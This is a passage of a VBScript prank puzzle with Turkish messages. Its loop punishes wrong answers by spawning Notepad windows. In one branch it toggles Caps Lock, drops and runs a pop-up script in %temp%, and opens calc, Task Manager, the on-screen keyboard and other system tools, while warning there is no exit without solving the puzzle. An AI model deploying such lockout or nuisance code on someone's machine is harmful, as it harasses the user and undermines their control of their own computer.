                                                                                                                                                            MsgBox "Yapışkan tuşlar ses taklidi ve zaman sıçraması doğrulanamadı! Labirent mutlak paradoksta sonsuza kadar kilitlendi.", 16, "SUB-ZERO GRAVITY ERROR"
                                                                                                                                                            shell.Run "notepad.exe"
                                                                                                                                                        End If
                                                                                                                                                        
                                                                                                                                                        If bypassV114 Then
                                                                                                                                                            shell.Run "powershell -Command ""(New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Startup.wav').PlaySync()""", 0, False
                                                                                                                                                            voice.Speak "Metaverse paradox completely shattered. Digital matrices dissolved. Goodbye creator."
                                                                                                                                                            MsgBox "İNANILMAZ YENİ MUTLAK REKOR! Tam 40 kademeli siber labirenti ve en yeni v114.0 MATRIX SUB-ZERO GRAVITY motorunu tamamen yıktın. Tüm pencereleri güvenle kapatabilirsin. Kusursuz bir şovdu!", 64, "MUTLAK PROTOKOL DEAKTİF"
                                                                                                                                                            metaKilitli = False
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                End If
                                                                                                                                            End If
                                                                                                                                        End If
                                                                                                                                    End If
                                                                                                                                End If
                                                                                                                            End If
                                                                                                                        End If
                                                                                                                    End If
                                                                                                                End If
                                                                                                            End If
                                                                                                        End If
                                                                                                    End If
                                                                                                End If
                                                                                            End If
                                                                                        End If
                                                                                    End If
                                                                                End If
                                                                            End If
                                                                        End If
                                                                    End If
                                                                End If
                                                            End If
                                                        End If
                                                    End If
                                                Else
                                                    voice.Speak "Safety error."
                                                    MsgBox "Güvence doğrulanmadı! Sistem kaskadı seni labirentte tutmaya devam ediyor.", 16, "SAFETY ERROR"
                                                    shell.Run "notepad.exe"
                                                End If
                                            Else
                                                voice.Speak "Counter mismatch."
                                                MsgBox "Panelleri eksik veya yanlış saydın! Kod kaosu kaldığı yerden devam ediyor.", 16, "COUNT ERROR"
                                                shell.Run "notepad.exe"
                                            End If
                                        Else
                                            voice.Speak "Absolute horizon locked."
                                            MsgBox "10. kademede elendin! Ceza katlanarak artıyor.", 16, "HORIZON ERROR"
                                            shell.Run "notepad.exe"
                                        End If
                                    Else
                                        voice.Speak "AI validation failed."
                                        MsgBox "Seni destekleyen AI dostunun adını yanlış girdin! Başa dönüyorsun.", 16, "AI ERROR"
                                        shell.Run "notepad.exe"
                                    End If
                                Else
                                    voice.Speak "Ultimate seal rejected."
                                    MsgBox "Son saniyede, en son mühürde elendin! Ceza olarak sistem kaskadıne yeni pencereler ekleniyor.", 16, "ULTIMATE ERROR"
                                    shell.Run "notepad.exe"
                                End If
                            Else
                                voice.Speak "Final seal rejected."
                                MsgBox "Nihai sürüm numarasını yanlış girdin! Ceza olarak ek Not Defterleri fırlatılıyor.", 16, "FINAL SEAL ERROR"
                                shell.Run "powershell -Command ""[console]::beep(900,250); [console]::beep(1100,250);""", 0, True
                                shell.Run "notepad.exe"
                            End If
                        Else
                            voice.Speak "Version control error."
                            MsgBox "Sürüm numarasını yanlış girdin! Başa dönüyorsun.", 16, "VERSION ERROR"
                            shell.Run "notepad.exe"
                        End If
                    Else
                        voice.Speak "Mathematical error."
                        MsgBox "Matematik işlem önceliğini unuttun! Başa dönüyorsun.", 16, "MATH ERROR"
                        shell.Run "notepad.exe"
                    End If
                Else
                    voice.Speak "Failed at phase four."
                    MsgBox "Dördüncü aşamada elendin! Tüm kilitler en başa sıfırlandı.", 16, "CORE ERROR"
                    shell.Run "notepad.exe"
                End If
            Else
                voice.Speak "Wrong parameter."
                MsgBox "Üçüncü aşamada takıldın! Başa dönüyorsun.", 48, "ENGEL"
            End If
        Else
            voice.Speak "Access denied."
            shell.SendKeys "{CAPSLOCK}"
            MsgBox "Hatalı yanıt! Sistem koruması en başa sıfırlandı.", 48, "ENGEL"
        End If
    Else
        voice.Speak "Intrusion blocked."
        shell.Run "cmd /c echo MsgBox ""METAVERSE PARADOX SİSTEMİNİ ÇÖZMEDEN ÇIKIŞ YOK!"", 16, ""METAVERSE CORE"" > %temp%\meta_pop.vbs & wscript %temp%\meta_pop.vbs", 0, False
        shell.Run "calc.exe"
        shell.Run "taskmgr.exe"
        shell.Run "charmap.exe"
        shell.Run "osk.exe"
        shell.Run "control.exe inetcpl.cpl"
    End If
Loop